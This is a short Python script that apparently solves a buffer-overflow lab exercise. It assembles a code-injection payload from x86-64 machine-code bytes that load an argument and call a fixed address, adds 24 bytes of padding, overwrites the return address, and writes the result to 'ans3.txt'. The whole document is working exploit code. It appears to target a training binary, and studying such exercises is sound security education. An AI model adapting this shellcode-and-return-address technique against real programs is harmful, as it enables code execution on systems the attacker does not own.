move_0x72_rdi = b"\x48\xc7\xc7\x72\x00\x00\x00"
move_0x401216_rax = b"\x48\xc7\xc0\x16\x12\x40\x00"
call_rax = b"\xff\xd0"
padding = b"A" * 24
jmp_xs_address = b"\x34\x13\x40\x00\x00\x00\x00\x00"
payload = move_0x72_rdi + move_0x401216_rax + call_rax + padding + jmp_xs_address
# Write the payload to a file
with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")